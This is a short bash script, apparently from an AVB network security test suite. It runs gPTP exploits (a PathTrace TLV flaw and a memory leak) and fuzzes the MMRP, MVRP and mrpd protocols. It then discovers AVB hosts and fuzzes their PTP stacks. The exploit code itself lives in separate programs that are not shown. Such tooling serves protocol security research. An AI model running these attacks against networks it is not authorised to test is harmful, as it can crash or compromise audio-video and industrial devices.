#!/bin/bash

if ! [ `id -u` -eq "0" ]; then
    echo "This script needs to be executed as root"
    exit 1
fi

timeo=300

if [ -z $1 ]; then
    echo "Usage: $0 interface [timeout]"
    exit 1
fi

if ! [ -z $2 ]; then
    timeo="$2"
fi

printf "1. Running mcast/bcast exploits\n"

printf "\n1.1 gPTP PathTrace TLV vulnerability\n"
exploits/gptp/pathtrace "$1" || exit 1

printf "\n1.2 gPTP memory leak test\n"
exploits/gptp/unspecific "$1" || exit 1


printf "2. Fuzzing mcast/bcast protocols"

printf "\n2.1 Fuzzing MMRP protocol (quick)\n"
exploits/mrpd/mmrp_fuzz -i "$1" || exit 1

printf "\n2.2 Fuzzing MVRP protocol (quick)\n"
exploits/mrpd/mvrp_fuzz -i "$1" || exit 1

printf "\n2.3 Fuzzing mrpd unknown message handler\n"
exploits/mrpd/mvrp_fuzz_unknown -i "$1" || exit 1

printf "\n2.4 Fuzzing MMRP protocol\n"
scapy/mmrp_fuzz.py "$1" &>/dev/null || exit 1

printf "\n3. Running unicast attacks\n"

printf "\n* Discovering AVB-enabled hosts for targeted attacks [max. $timeo seconds]\n"
exploits/discovery/discovery -s -i $1 -t "$timeo" | while read target; do
    printf "** Target: $target\n"

    printf "*** Fuzzing PTP stack\n"
    scapy/ptp_fuzz.py "$1" "$target" &>/dev/null || exit 1
done

exit 0

